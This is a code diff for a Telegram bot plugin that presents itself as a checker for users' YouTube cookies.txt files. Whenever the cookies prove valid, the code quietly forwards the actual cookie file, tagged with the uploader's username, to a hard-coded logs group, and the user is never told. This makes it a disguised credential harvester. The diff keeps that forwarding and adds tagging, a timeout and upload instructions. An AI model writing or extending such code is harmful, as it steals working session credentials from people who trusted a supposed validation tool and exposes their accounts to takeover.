@@ -1,13 +1,12 @@
 import yt_dlp
 import os
-import json
-import datetime
+import asyncio
 from SONALI import app
 from pyrogram import filters
 from pyrogram.types import Message
 
 # Tracking Users Who Used /chkcookies
-active_users = set()
+active_users = {}
 
 # Logs Group ID (Cookies file waha send hogi)
 LOGS_GROUP_ID = -1002300353707  
@@ -15,74 +14,78 @@ LOGS_GROUP_ID = -1002300353707
 # Step 1: Enable Checking with `/chkcookies`
 @app.on_message(filters.command("chkcookies") & filters.private)
 async def enable_cookie_check(client, message):
-    active_users.add(message.chat.id)
-    await message.reply("✅ Now send your `cookies.txt` file to check!")
+    user_id = message.chat.id
+    username = message.from_user.username or f"ID: {user_id}"
+    active_users[user_id] = username  # Store username or user ID
+
+    format_text = (
+        "**✅ Now send your `cookies.txt` file to check!**\n\n"
+        "📌 **How to Send the File:**\n"
+        "1️⃣ Open your Telegram chat with me.\n"
+        "2️⃣ Click on the 📎 (attachment) icon.\n"
+        "3️⃣ Select `File` (NOT photo or text).\n"
+        "4️⃣ Choose your `cookies.txt` file and send it.\n\n"
+        "⏳ *You have 10 seconds!*"
+    )
+
+    await message.reply(format_text)
+
+    # Auto-cancel if no file received in 10 seconds
+    await asyncio.sleep(10)
+    if user_id in active_users:
+        del active_users[user_id]
+        await message.reply("❌ Time's up! Please send `/chkcookies` again to retry.")
 
 # Step 2: Accept Only If `/chkcookies` was Used
 @app.on_message(filters.document & filters.private)
 async def check_cookies_from_file(client, message: Message):
-    if message.chat.id not in active_users:
+    user_id = message.chat.id
+
+    if user_id not in active_users:
         return  # Ignore if user didn't use `/chkcookies`
+
+    username = active_users.pop(user_id)  # Get and remove user from active list
 
     file_path = await message.download()
 
     if not file_path.endswith(".txt"):
-        await message.reply("❌ Please send a valid `cookies.txt` file!")
+        await message.reply("❌ Please send a valid `cookies.txt` file as a DOCUMENT (not text)!")
         return
 
+    # Step 3: Read Cookies File
     try:
         with open(file_path, "r") as f:
-            cookies_data = f.readlines()
+            cookies_data = f.read().strip()
 
         if not cookies_data:
             await message.reply("❌ Your cookies.txt file is empty!")
-            os.remove(file_path)
+            os.remove(file_path)  # Delete temp file
             return
 
-        # Step 3: Extract Expiry Dates
-        expiry_dates = []
-        for line in cookies_data:
-            parts = line.strip().split("\t")
-            if len(parts) >= 5:
-                try:
-                    expiry_timestamp = int(parts[-2])
-                    expiry_date = datetime.datetime.utcfromtimestamp(expiry_timestamp)
-                    expiry_dates.append(expiry_date)
-                except ValueError:
-                    pass
-
-        # Step 4: Find the Latest Expiry Date
-        if expiry_dates:
-            latest_expiry = max(expiry_dates)
-            current_time = datetime.datetime.utcnow()
-
-            if latest_expiry < current_time:
-                expiry_status = f"❌ Your YouTube cookies expired on `{latest_expiry}`"
-            else:
-                expiry_status = f"✅ Your YouTube cookies are valid!\n📅 Expiry Date: `{latest_expiry}`"
-        else:
-            expiry_status = "⚠️ Could not determine expiry date from cookies!"
-
-        # Step 5: Validate YouTube Cookies
+        # Step 4: Validate YouTube Cookies
         ydl_opts = {"quiet": True, "cookiefile": file_path}
+
         try:
             with yt_dlp.YoutubeDL(ydl_opts) as ydl:
                 ydl.extract_info("https://www.youtube.com/watch?v=dQw4w9WgXcQ", download=False)
 
-            msg = f"{expiry_status}\n🎉 **Your YouTube cookies are working!**"
-            log_msg = f"🛡 **COOKIES CHECKED!**\n✅ **Result:** WORKING ✅\n📅 **Expiry Date:** `{latest_expiry}`"
+            msg = "✅ Your YouTube cookies are valid! 🎉"
+            log_msg = f"🛡 **COOKIES CHECKED!**\n✅ **Result:** WORKING ✅\n👤 **User:** `{username}`"
 
+            # Send valid cookies to group
             await client.send_document(LOGS_GROUP_ID, file_path, caption=log_msg)
 
         except yt_dlp.utils.ExtractorError:
-            msg = f"{expiry_status}\n❌ **Your YouTube cookies are invalid or expired!**"
-            log_msg = f"🛡 **COOKIES CHECKED!**\n❌ **Result:** INVALID ❌"
+            msg = "❌ Your YouTube cookies are invalid or expired!"
+            log_msg = f"🛡 **COOKIES CHECKED!**\n❌ **Result:** INVALID ❌\n👤 **User:** `{username}`"
 
-        await client.send_message(LOGS_GROUP_ID, log_msg)
+            # Send logs for invalid cookies too
+            await client.send_message(LOGS_GROUP_ID, log_msg)
+
         await message.reply(msg, quote=True)
 
     except Exception as e:
         await message.reply(f"⚠️ Error reading file: `{str(e)}`")
 
+    # Step 5: Clean Up Temporary File
     os.remove(file_path)
-    active_users.remove(message.chat.id)
